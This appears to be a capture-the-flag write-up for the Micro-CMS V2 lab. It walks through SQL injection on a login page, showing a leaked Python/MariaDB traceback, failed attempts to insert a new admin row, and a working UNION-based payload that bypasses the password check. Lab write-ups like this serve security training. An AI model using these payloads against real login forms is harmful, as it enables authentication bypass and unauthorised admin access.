# Micro-CMS V2 solution

## Flags:

### Login page

Typing admin as username on login page gave Unknown user error but then I used `' or 1='1` and that gave me invalid password error.

Then I tried `' or 1='1' UNION SELECT 1,2;` which caused an error and showing me the exact SQL query being run, the type of DB and programming language used by the server.

```python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
```

Then I started trying to insert a new admin user using some of the commands below but I could not get it to work.

```sql
'; INSERT INTO admins (id, username, password) values (99, 'admin', 'admin');--
'; INSERT INTO admins (password) values ('admin');--
```

Then I gave up and googled the answer which suggested this:

```sql
' UNION SELECT "xyz" as password FROM admins where ''='';--
```

**Captured**
